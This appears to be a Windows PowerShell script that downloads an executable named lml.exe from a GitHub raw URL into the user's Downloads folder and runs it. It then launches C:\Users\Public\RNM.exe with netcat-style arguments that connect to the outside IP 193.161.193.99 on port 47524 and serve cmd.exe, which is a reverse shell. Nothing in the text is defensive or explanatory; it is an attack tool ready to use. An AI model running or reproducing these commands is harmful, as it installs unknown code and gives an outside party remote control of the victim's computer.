$path = "C:\Users\$env:USERNAME\Downloads\lml.exe"

if (Test-Path $path) {
    Write-Host "Listo"
} else {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/fullcaleta/dadddos/main/lml.exe" -OutFile $path
}


taskkill /F /IM lml.exe
C:\Users\ALOOO\Downloads\lml.exe
Start-Process -FilePath "C:\Users\Public\RNM.exe" -ArgumentList "-nv 193.161.193.99 47524 -e cmd.exe"
